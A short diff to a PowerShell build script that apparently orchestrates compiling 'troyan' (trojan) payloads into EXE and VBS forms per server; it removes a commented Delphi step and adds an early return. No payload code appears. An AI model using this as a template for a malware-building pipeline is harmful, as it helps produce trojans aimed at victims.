@@ -60,11 +60,10 @@ if ([string]::IsNullOrEmpty($server.rootDir)) {
 #general script to exe
 & (Join-Path -Path $server.troyanDir -ChildPath "./troyan2exe.ps1") -serverName $serverName
 
-#delphi
-### & (Join-Path -Path $server.troyanDelphiDir -ChildPath "./delphicompile.ps1") -serverName $serverName
-
 #vbs
 & (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName
+
+return
 
 #dn
 & (Join-Path -Path $scriptDir -ChildPath "./compile.dn.ps1") -serverName $serverName
